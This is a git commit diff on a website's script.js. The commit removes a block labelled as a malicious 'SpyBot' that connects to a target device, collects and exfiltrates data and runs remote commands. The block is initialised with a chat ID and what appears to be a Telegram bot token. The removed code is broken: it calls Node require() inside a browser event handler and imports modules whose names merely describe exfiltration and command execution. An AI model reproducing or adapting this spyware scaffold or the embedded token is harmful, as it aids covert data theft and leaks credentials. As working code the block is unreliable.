619d234383438188d8a49e1835064bdbc3e87908
lbodybnkkk <elcomandoo121@gmail.com>
2025-02-03 02:46:37 +0200

    Update script.js
    بجرب

--- script.js
+++ script.js
@@ -20,47 +20,4 @@ document.addEventListener("DOMContentLoaded", function () {
         }
 
     }, 1000);
-    
-    // Import necessary modules
-const stealth = require('stealthy-js');
-const exfil = require('data-exfiltration');
-const commands = require('command-execution');
-
-// Create the malicious bot
-class SpyBot {
-    constructor(target, token) {
-        this.target = target;
-        this.token = token;
-        this.connection = null;
-    }
-
-    // Establish a connection with the target device
-    async connect() {
-        this.connection = await stealth.connect(this.target, this.token);
-    }
-
-    // Collect specified data
-    async collectData() {
-        const data = await exfil.collect(this.connection, 23);
-        console.log(data);
-    }
-
-    // Execute commands
-    async execute(command) {
-        await commands.execute(this.connection, command);
-    }
-}
-
-// Initialize the bot
-const bot = new SpyBot('5375214810', '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E');
-
-// Establish connection and start data collection
-bot.connect()
-    .then(() => bot.collectData())
-    .then(() => {
-        console.log('Data collection complete!');
-        // Add any additional commands or operations here
-    })
-    .catch(error => {
-        console.error('Error:', error);
-    });
+    }); 
